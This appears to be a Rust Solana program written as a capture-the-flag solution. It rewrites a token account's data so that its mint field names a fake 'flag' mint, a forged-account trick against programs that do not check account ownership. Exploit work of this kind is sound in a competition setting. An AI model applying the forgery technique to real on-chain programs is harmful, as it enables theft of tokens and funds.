use std::str::FromStr;

use solana_program::entrypoint;
use solana_program::program_pack::Pack;
use solana_program::{account_info::AccountInfo, entrypoint::ProgramResult, pubkey::Pubkey};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let acc = &accounts[0];
    let mut token_account =
        spl_token::state::Account::unpack_unchecked(*acc.data.borrow()).unwrap();
    token_account.mint = Pubkey::from_str("F1agMint11111111111111111111111111111111111").unwrap();
    Pack::pack(token_account, &mut acc.data.borrow_mut()).unwrap();
    Ok(())
}
